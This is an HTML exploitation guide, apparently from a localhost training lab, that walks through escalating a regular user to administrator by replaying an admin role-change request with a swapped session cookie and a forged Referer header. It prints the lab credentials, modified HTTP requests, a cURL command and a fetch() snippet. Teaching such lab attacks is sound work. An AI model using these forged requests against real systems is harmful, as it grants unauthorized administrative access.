<div class="doc-header">
    <h1>Exploitation Guide</h1>
    <p>Step-by-step walkthrough of the attack</p>
</div>

<div class="content-section">
    <h2>Prerequisites</h2>
    <ul>
        <li><strong>Burp Suite</strong> or similar intercepting proxy</li>
        <li>Two browser sessions (or a private/incognito window)</li>
        <li>Admin credentials: <code>administrator:admin</code></li>
        <li>Attacker credentials: <code>wiener:peter</code></li>
    </ul>
</div>

<div class="content-section">
    <h2>Phase 1: Reconnaissance</h2>
    
    <h3>Step 1: Login as Admin</h3>
    <p>
        First, log in with the administrator account to understand how the admin panel works 
        and observe the normal request flow.
    </p>
    
    <div class="code-block">
        <span class="code-label">Credentials</span>
        <code>Username: administrator
Password: admin</code>
    </div>
    
    <h3>Step 2: Access the Admin Panel</h3>
    <p>
        Navigate to the Admin Panel and observe the list of users. Note the "Upgrade" and 
        "Downgrade" buttons next to each user.
    </p>
    
    <h3>Step 3: Capture a Role Change Request</h3>
    <p>
        With Burp Suite intercepting, click to upgrade or downgrade any user (e.g., carlos). 
        Observe the request that is sent:
    </p>
    
    <div class="code-block">
        <span class="code-label">Captured Request</span>
        <code>GET /AC/lab13/admin-roles.php?username=carlos&action=upgrade HTTP/1.1
Host: localhost
Cookie: PHPSESSID=admin_session_id_here
Referer: http://localhost/AC/lab13/admin.php
User-Agent: Mozilla/5.0 ...</code>
    </div>
    
    <div class="info-box info">
        <h4>üí° Key Observation</h4>
        <p>
            Notice the <strong>Referer header</strong> points to the admin panel. This is 
            what the server checks for authorization. Send this request to Burp Repeater 
            for later manipulation.
        </p>
    </div>
</div>

<div class="content-section">
    <h2>Phase 2: Obtain Attacker Session</h2>
    
    <h3>Step 4: Open New Browser Session</h3>
    <p>
        Open a private/incognito browser window (or use a different browser). This ensures 
        you have a completely separate session.
    </p>
    
    <h3>Step 5: Login as Wiener</h3>
    <p>
        Log in with the regular user credentials:
    </p>
    
    <div class="code-block">
        <span class="code-label">Credentials</span>
        <code>Username: wiener
Password: peter</code>
    </div>
    
    <h3>Step 6: Copy Session Cookie</h3>
    <p>
        Open your browser's Developer Tools (F12) and navigate to the Application or Storage 
        tab. Find the <code>PHPSESSID</code> cookie and copy its value.
    </p>
    
    <div class="code-block">
        <span class="code-label">Browser Console</span>
        <code>document.cookie
// "PHPSESSID=wiener_session_id_here"</code>
    </div>
</div>

<div class="content-section">
    <h2>Phase 3: Execute the Attack</h2>
    
    <h3>Step 7: Modify the Captured Request</h3>
    <p>
        In Burp Repeater, modify the captured admin request:
    </p>
    <ol>
        <li>Replace the admin's <code>PHPSESSID</code> with wiener's session cookie</li>
        <li>Change the <code>username</code> parameter to <code>wiener</code></li>
        <li>Ensure the <code>action</code> is set to <code>upgrade</code></li>
        <li>Keep the <code>Referer</code> header pointing to <code>/admin</code></li>
    </ol>
    
    <div class="code-block">
        <span class="code-label">Modified Exploit Request</span>
        <code>GET /AC/lab13/admin-roles.php?username=wiener&action=upgrade HTTP/1.1
Host: localhost
<span style="color: #ff6666;">Cookie: PHPSESSID=wiener_session_id_here</span>
<span style="color: #ffcc00;">Referer: http://localhost/AC/lab13/admin</span>
User-Agent: Mozilla/5.0 ...</code>
    </div>
    
    <h3>Step 8: Send the Request</h3>
    <p>
        Click "Send" in Burp Repeater. The server will:
    </p>
    <ol>
        <li>Verify a valid session exists (wiener is logged in) ‚úì</li>
        <li>Check if Referer contains '/admin' (it does!) ‚úì</li>
        <li>Execute the role upgrade for username 'wiener' ‚úì</li>
    </ol>
    
    <div class="info-box success">
        <h4>‚úÖ Attack Successful!</h4>
        <p>
            The server trusted the Referer header and upgraded wiener to administrator, 
            even though wiener's session had no admin privileges. The attack succeeds 
            because the server never verified the actual role of the logged-in user.
        </p>
    </div>
    
    <h3>Step 9: Verify the Privilege Escalation</h3>
    <p>
        Refresh wiener's browser page. You should now see:
    </p>
    <ul>
        <li>Admin badge on the profile page</li>
        <li>Access to the Admin Panel</li>
        <li>Lab completion confirmation</li>
    </ul>
</div>

<div class="content-section">
    <h2>Alternative Attack Method</h2>
    
    <h3>Using cURL</h3>
    <p>
        The same attack can be performed using cURL from the command line:
    </p>
    
    <div class="code-block">
        <span class="code-label">cURL Command</span>
        <code>curl -X GET "http://localhost/AC/lab13/admin-roles.php?username=wiener&action=upgrade" \
     -H "Cookie: PHPSESSID=wiener_session_id" \
     -H "Referer: http://localhost/AC/lab13/admin" \
     -v</code>
    </div>
    
    <h3>Using Browser Developer Tools</h3>
    <p>
        You can also use the browser's Fetch API from the console:
    </p>
    
    <div class="code-block">
        <span class="code-label">JavaScript Fetch</span>
        <code>fetch('/AC/lab13/admin-roles.php?username=wiener&action=upgrade', {
    headers: {
        'Referer': 'http://localhost/AC/lab13/admin'
    },
    credentials: 'include'
}).then(r => r.text()).then(console.log);</code>
    </div>
    
    <div class="info-box warning">
        <h4>‚ö†Ô∏è Note on Browser Restrictions</h4>
        <p>
            Modern browsers may restrict setting the Referer header in JavaScript. 
            Burp Suite or cURL remains the most reliable method for this attack.
        </p>
    </div>
</div>

<div class="content-section">
    <h2>Attack Summary Diagram</h2>
    
    <div class="diagram">
        <h4 style="color: #ff6666; margin-bottom: 1.5rem;">Attack Flow</h4>
        <div class="diagram-row">
            <div class="diagram-box">1. Login as admin<br><small>Capture request</small></div>
            <span class="diagram-arrow">‚Üí</span>
            <div class="diagram-box">2. Login as wiener<br><small>Get session cookie</small></div>
        </div>
        <div style="text-align: center; margin: 1rem 0;">
            <span class="diagram-arrow">‚Üì</span>
        </div>
        <div class="diagram-row">
            <div class="diagram-box">3. Modify request<br><small>Swap cookies, change username</small></div>
            <span class="diagram-arrow">‚Üí</span>
            <div class="diagram-box" style="background: rgba(0, 255, 0, 0.2); border-color: #00ff00;">4. Success!<br><small>Wiener is admin</small></div>
        </div>
    </div>
</div>
